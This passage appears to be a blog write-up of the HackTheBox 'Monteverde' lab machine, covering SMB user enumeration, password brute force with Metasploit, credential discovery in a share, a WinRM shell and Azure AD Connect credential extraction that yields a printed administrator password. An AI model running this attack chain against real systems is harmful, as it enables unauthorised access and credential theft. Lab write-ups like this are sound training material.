Group 'Domain Users' (RID: 513) has member: MEGABANK\krbtgt
Group 'Domain Users' (RID: 513) has member: MEGABANK\AAD_987d7f2f57d2
Group 'Domain Users' (RID: 513) has member: MEGABANK\mhope
Group 'Domain Users' (RID: 513) has member: MEGABANK\SABatchJobs
Group 'Domain Users' (RID: 513) has member: MEGABANK\svc-ata
Group 'Domain Users' (RID: 513) has member: MEGABANK\svc-bexec
Group 'Domain Users' (RID: 513) has member: MEGABANK\svc-netapp
Group 'Domain Users' (RID: 513) has member: MEGABANK\dgalanos
Group 'Domain Users' (RID: 513) has member: MEGABANK\roleary
Group 'Domain Users' (RID: 513) has member: MEGABANK\smorgan
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Group Policy Creator Owners' (RID: 520) has member: MEGABANK\Administrator
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group 'Operations' (RID: 2609) has member: MEGABANK\smorgan

 ======================================================================= 
|    Users on 10.10.10.172 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.

 ============================================= 
|    Getting printer info for 10.10.10.172    |
 ============================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.
Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Tue May 26 13:46:08 2020

```

On examining the above output, we were able to identify usernames being revealed in the output. To get the list of users, we issued the following command:

```yml
cat enum4linux | grep MEGABANK | cut -d &quot;:&quot; -f3 | cut -d '\' -f2 &gt; user_list.txt
```
**Result**
```yml
Guest
dgalanos
roleary
Administrator
AAD_987d7f2f57d2
mhope
Administrator
krbtgt
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
Administrator
smorgan
```
&amp;nbsp;

### 1.3 || SMB Brute Force

As the list of usernames was extracted, we'll be trying to brute force the SMB service using ***metasploit***. Using `auxiliary/scanner/smb/smb_login` in metasploit and setting the options as shown in below screenshot:

![deploy using travis](/assets/img/posts/HTB/Monteverde/1.png){:class=&quot;img-fluid&quot;}  

![deploy using travis](/assets/img/posts/HTB/Monteverde/2.png){:class=&quot;img-fluid&quot;}  

&amp;nbsp;

### 1.4 || SMB Enumeration

On SMB Brute forcing to the target macine, we were successfully able to get a legit set of credentials. To enumrate SMB, we'll be using [smbclient]()

**Command Issued**

```yml
smclient -U SABatchJobs%SABatchJobs -L //10.10.10.172/
```

![deploy using travis](/assets/img/posts/HTB/Monteverde/3.png){:class=&quot;img-fluid&quot;}  

On enumeration, we were able to access `users` sharename and find a file named `azure.xml` under `mhope` users folder consisting of password of the same user.

**Command Issued**

```yml
smclient -U SABatchJobs%SABatchJobs -L //10.10.10.172/users$
```

![deploy using travis](/assets/img/posts/HTB/Monteverde/4.png){:class=&quot;img-fluid&quot;}  

![deploy using travis](/assets/img/posts/HTB/Monteverde/5.png){:class=&quot;img-fluid&quot;}  

&amp;nbsp;

## 2. Low-Privilege Shell 

We were able get Win-RM (Low-privilege) shell with the help of credentials found in the ealier stage using a tool name [evil-winrm]() and get `user.txt` accordingly.

![deploy using travis](/assets/img/posts/HTB/Monteverde/6.png){:class=&quot;img-fluid&quot;}  

&amp;nbsp;

## 3. Privilege Escalation

### 3.1 || Enumerate local system

Our next step to get maximum level of privilege and in the process od doing so, we were able to discover the target machines uses `Azure AD`. On searching for exploits with respect to `Azure AD`, we were able to discover a script to create a new set of administrator credentials.

![deploy using travis](/assets/img/posts/HTB/Monteverde/7.png){:class=&quot;img-fluid&quot;}  

Uploading the script by using the upload functionality of evil-winrm and executing it by using the following steps and the scripts produces the administrator credentials:


![deploy using travis](/assets/img/posts/HTB/Monteverde/8.png){:class=&quot;img-fluid&quot;}  

**Command Issued**

```yml
./Azure-ADConnect.ps1
import-module ./Azure-ADConnect.ps1
Azure-ADConnect -server 127.0.0.1 -db ADSync 
```

![deploy using travis](/assets/img/posts/HTB/Monteverde/9.png){:class=&quot;img-fluid&quot;}  

&amp;nbsp;

### 3.2 || Privileged Shell

Using the genrated credentials by the script (`administrator:d0m@in4adminyeah!`), we were able to get the highest level of privilege of the machine.

![deploy using travis](/assets/img/posts/HTB/Monteverde/10.png){:class=&quot;img-fluid&quot;}  

&amp;nbsp;

### 3.3 || root.txt

![deploy using travis](/assets/img/posts/HTB/Monteverde/11.png){:class=&quot;img-fluid&quot;}  

## Key Takeway:

As the main motto to build HackTheBox platform for security researchers is to help us hone our testing skills and hence, every machine has its key takeways.

For me, the key takeway was a reminder for basic routine check of security misconfiguration where the password of one the users were set as the username itself.</content><author><name>Rajat Rao</name></author><category term="HackTheBox" /><summary type="html">Brief     On enumerating different services of Monteverde machine, we were able extract list of users available in the target machine. Due to security misconfiguration, one of the users has set the password same as the username and this was identified by brute forcing the same using smb_login module from metasploit. Levering the misconfiguration, we were able to login to SMB with the help of smbclient and on further enumeration, we were able to extract a file named azure.xml under mhope user folder consisting of credentails of the same user. Making the use of credential found, we were able to get Windows Remote Management shell with the help of tool named evil-winrm which targets on port 5985 port. Here, we were able to get basic shell and were able pwn the user.txt part of the challenge. Moving to privilege escalation part, enumemrating local system, we were able to understand the target machine has Azure Active Directory Connect. On searching for exploits on google, we were able to find a script and privilege to highest level of authorization and complete the final challenge of getting root.txt</summary></entry></feed>